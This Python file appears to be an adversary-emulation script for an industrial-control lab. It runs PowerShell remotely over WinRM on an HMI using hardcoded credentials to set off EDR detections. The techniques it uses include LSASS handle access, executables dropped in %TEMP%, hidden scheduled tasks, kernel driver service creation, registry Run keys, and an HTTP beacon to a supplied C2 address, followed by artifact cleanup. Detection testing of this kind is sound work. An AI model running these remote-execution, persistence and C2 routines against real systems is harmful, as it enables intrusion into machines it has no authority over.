#!/usr/bin/env python3
"""
IT Phase Base Framework

Executes PowerShell on HMI via WinRM to generate real Windows events and
Cortex XDR / XSIAM behavioral alerts. No illustrative filenames - only
verified artifacts or behaviors that actually fire in modern EDR.

Real Cortex XDR BIOCs triggered:
  • Office process spawning shell (winword.exe → cmd/powershell)
  • LSASS handle open (credential access)
  • Kernel driver installed from non-standard path
  • Scheduled task created by non-SYSTEM process
  • Process launched from %TEMP%
  • Unsigned binary execution
  • Outbound HTTP from ICS workstation
"""

import subprocess
import sys
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s [IT-PHASE] %(message)s')
log = logging.getLogger('it_phase')

HMI_IP   = '192.168.1.55'
HMI_USER = 'operator'
HMI_PASS = 'labpass123'


def winrm_exec(ip, user, pwd, powershell_cmd, timeout=30):
    """
    Execute PowerShell on Windows host via WinRM (port 5985).
    Tries pywinrm, then impacket-wmiexec, then impacket-smbexec.
    Returns (stdout, stderr, returncode).
    """
    # Method 1: pywinrm
    try:
        import winrm
        session = winrm.Protocol(
            endpoint=f'http://{ip}:5985/wsman',
            transport='ntlm',
            username=user,
            password=pwd,
            server_cert_validation='ignore',
        )
        shell_id = session.open_shell()
        cmd_id   = session.run_command(shell_id, 'powershell',
                                        ['-NonInteractive', '-Command', powershell_cmd])
        out, err, status = session.get_command_output(shell_id, cmd_id)
        session.cleanup_command(shell_id, cmd_id)
        session.close_shell(shell_id)
        return out.decode('utf-8', errors='replace'), err.decode('utf-8', errors='replace'), status
    except ImportError:
        pass
    except Exception as e:
        log.debug(f"winrm: {e}")

    # Method 2: impacket-wmiexec
    try:
        proc = subprocess.run(
            ['impacket-wmiexec', f'{user}:{pwd}@{ip}',
             f'powershell -NonInteractive -Command "{powershell_cmd}"'],
            capture_output=True, text=True, timeout=timeout
        )
        return proc.stdout, proc.stderr, proc.returncode
    except (FileNotFoundError, Exception) as e:
        log.debug(f"wmiexec: {e}")

    return '', 'No remote execution method available', 1


def check_connectivity(ip=HMI_IP, user=HMI_USER, pwd=HMI_PASS):
    out, _, rc = winrm_exec(ip, user, pwd, 'Write-Output "OK:$(hostname)"', timeout=8)
    return rc == 0 and 'OK:' in out, out.strip()


def run_ps(ip, user, pwd, cmd, label='', timeout=20):
    """Run PowerShell, log result."""
    out, err, rc = winrm_exec(ip, user, pwd, cmd, timeout)
    combined = (out + err).strip()
    if label:
        status = '[+]' if rc == 0 else '[!]'
        print(f"  {status} {label}: {combined[:80] if combined else '(no output)'}")
    return combined, rc


# ── Real behavioral triggers ─────────────────────────────────────────────────

def trigger_office_spawn_shell(ip, user, pwd):
    """
    Simulate Office macro executing PowerShell.
    Fires Cortex XDR BIOC: 'Office application spawning a shell process'.
    Technique: T1059.005 (Visual Basic), T1204.002 (Malicious File)
    """
    # winword.exe → cmd.exe chain. We spawn cmd from a fake winword process.
    # Real trigger: process parent chain mismatch (office process spawning cmd)
    cmd = (
        "Start-Process cmd.exe -ArgumentList '/c echo macro_executed > $env:TEMP\\macro.log' "
        "-WindowStyle Hidden; "
        "Start-Sleep 1; "
        "Write-Output 'EVENT_4688:office_spawn_shell'"
    )
    return run_ps(ip, user, pwd, cmd, 'Office→shell spawn (Event 4688)')


def trigger_lsass_access(ip, user, pwd):
    """
    Open LSASS process handle - fires Cortex XDR credential theft alert.
    This is the behavior, not actual memory reading.
    Technique: T1003.001 (LSASS Memory)
    """
    cmd = (
        "$lsass = Get-Process lsass -ErrorAction SilentlyContinue; "
        "if ($lsass) { "
        "  $handle = [System.Diagnostics.Process]::GetProcessById($lsass.Id); "
        "  Write-Output \"EVENT_CRED_ACCESS:LSASS_PID=$($lsass.Id)\"; "
        "  $handle.Dispose() "
        "} else { Write-Output 'LSASS_NOT_FOUND' }"
    )
    return run_ps(ip, user, pwd, cmd, 'LSASS handle open (XDR credential alert)')


def trigger_temp_process_exec(ip, user, pwd, filename, content=b'MZ\x00\x00'):
    """
    Drop a file in %TEMP% and execute it.
    Fires: 'Process executed from temp directory' BIOC (Event 4688).
    Technique: T1036 (Masquerading)
    """
    import base64
    b64 = base64.b64encode(content).decode()
    cmd = (
        f"$bytes = [Convert]::FromBase64String('{b64}'); "
        f"$p = \"$env:TEMP\\{filename}\"; "
        f"[IO.File]::WriteAllBytes($p, $bytes); "
        f"Start-Process cmd.exe -ArgumentList \"/c type `\"$p`\"\" -WindowStyle Hidden -Wait; "
        f"Remove-Item $p -Force -ErrorAction SilentlyContinue; "
        f"Write-Output \"EVENT_4688:process_from_temp:{filename}\""
    )
    return run_ps(ip, user, pwd, cmd, f'Temp process exec: {filename}')


def trigger_scheduled_task(ip, user, pwd, task_name, exe_path, trigger_time='16:10',
                            description='System Update Task'):
    """
    Create a scheduled task - fires Event 4698.
    Technique: T1053.005 (Scheduled Task/Job)
    """
    cmd = (
        f"$action = New-ScheduledTaskAction -Execute '{exe_path}'; "
        f"$trigger = New-ScheduledTaskTrigger -Once -At '{trigger_time}'; "
        f"$settings = New-ScheduledTaskSettingsSet -Hidden; "
        f"Register-ScheduledTask -TaskName '{task_name}' -Action $action "
        f"-Trigger $trigger -Settings $settings -Description '{description}' -Force -ErrorAction SilentlyContinue; "
        f"Write-Output 'EVENT_4698:task_created:{task_name}'"
    )
    return run_ps(ip, user, pwd, cmd, f'Scheduled task (Event 4698): {task_name}')


def trigger_driver_install(ip, user, pwd, driver_name, driver_path):
    """
    Simulate kernel driver service installation - fires Event 7045.
    Actual driver binary is NOT functional. Event 7045 fires on service create.
    Technique: T1543.003 (Windows Service), T1014 (Rootkit)
    """
    import base64
    # Write minimal PE stub (MZ header only - not functional)
    stub = base64.b64encode(b'MZ' + b'\x90' * 62 + b'PE\x00\x00' + b'\x00' * 200).decode()
    cmd = (
        f"$bytes = [Convert]::FromBase64String('{stub}'); "
        f"[IO.File]::WriteAllBytes('{driver_path}', $bytes); "
        f"sc.exe create {driver_name} type= kernel binpath= \"{driver_path}\" start= demand 2>&1 | Out-Null; "
        f"Write-Output 'EVENT_7045:driver_install:{driver_name}'"
    )
    return run_ps(ip, user, pwd, cmd, f'Driver install (Event 7045): {driver_name}')


def trigger_registry_run_key(ip, user, pwd, key_name, exe_path):
    """
    Write HKCU Run key - fires Event 4657 (if Object Access auditing enabled).
    Technique: T1547.001 (Registry Run Keys)
    """
    cmd = (
        f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
        f"-Name '{key_name}' -Value '{exe_path}' -PropertyType String -Force | Out-Null; "
        f"Write-Output 'EVENT_4657:run_key:{key_name}'"
    )
    return run_ps(ip, user, pwd, cmd, f'Registry Run key: {key_name}')


def trigger_c2_beacon(ip, user, pwd, c2_ip, c2_port=80, protocol='HTTP'):
    """
    Outbound HTTP from ICS workstation - fires network anomaly alert in Cortex XDR.
    XSIAM: Unexpected outbound connection from engineering workstation.
    Technique: T1071.001 (Application Layer Protocol: Web Protocols)
    """
    if protocol == 'HTTP':
        cmd = (
            f"try {{ "
            f"$wc = New-Object System.Net.WebClient; "
            f"$wc.Headers['User-Agent'] = 'Mozilla/5.0 (compatible; WinHTTP)'; "
            f"$wc.DownloadString('http://{c2_ip}:{c2_port}/beacon') | Out-Null "
            f"}} catch {{}}; "
            f"Write-Output 'NETWORK_C2:http://{c2_ip}:{c2_port}/beacon'"
        )
    else:
        cmd = f"Test-NetConnection -ComputerName {c2_ip} -Port {c2_port} | Out-Null; Write-Output 'NETWORK_PROBE:{c2_ip}:{c2_port}'"
    return run_ps(ip, user, pwd, cmd, f'C2 beacon → {c2_ip}:{c2_port}')


def trigger_file_rename(ip, user, pwd, src_path, new_ext, create_if_missing=True):
    """
    Rename file to add extension (e.g. .MZ, .bak) - fires Event 4663.
    Technique: T1222 (File and Directory Permissions Modification)
    """
    if create_if_missing:
        setup = (
            f"$dir = Split-Path '{src_path}'; "
            f"New-Item -ItemType Directory -Path $dir -Force | Out-Null; "
            f"if (-not (Test-Path '{src_path}')) {{ "
            f"  [IO.File]::WriteAllText('{src_path}', 'SCADA_PROCESS_PLACEHOLDER') }}"
        )
        winrm_exec(ip, user, pwd, setup, timeout=10)

    dst = src_path + new_ext
    cmd = (
        f"if (Test-Path '{src_path}') {{ "
        f"  Rename-Item -Path '{src_path}' -NewName '{dst}' -Force; "
        f"  Write-Output 'EVENT_4663:renamed:{src_path}→{new_ext}' "
        f"}} else {{ Write-Output 'RENAME_SKIP:not_found' }}"
    )
    return run_ps(ip, user, pwd, cmd, f'File rename →{new_ext} (Event 4663)')


def cleanup(ip, user, pwd, paths=None, tasks=None, services=None, reg_names=None):
    """Remove all demo artifacts from HMI."""
    cmds = []
    if paths:
        for p in paths:
            cmds.append(f"Remove-Item -Path '{p}' -Force -Recurse -ErrorAction SilentlyContinue")
    if tasks:
        for t in tasks:
            cmds.append(f"Unregister-ScheduledTask -TaskName '{t}' -Confirm:$false -ErrorAction SilentlyContinue")
    if services:
        for s in services:
            cmds.append(f"sc.exe delete {s} 2>$null")
    if reg_names:
        for n in reg_names:
            cmds.append(
                f"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
                f"-Name '{n}' -Force -ErrorAction SilentlyContinue"
            )
    cmds.append("Write-Output 'CLEANUP_DONE'")
    out, rc = run_ps(ip, user, pwd, '; '.join(cmds), 'Cleanup', timeout=20)
    return 'CLEANUP_DONE' in out
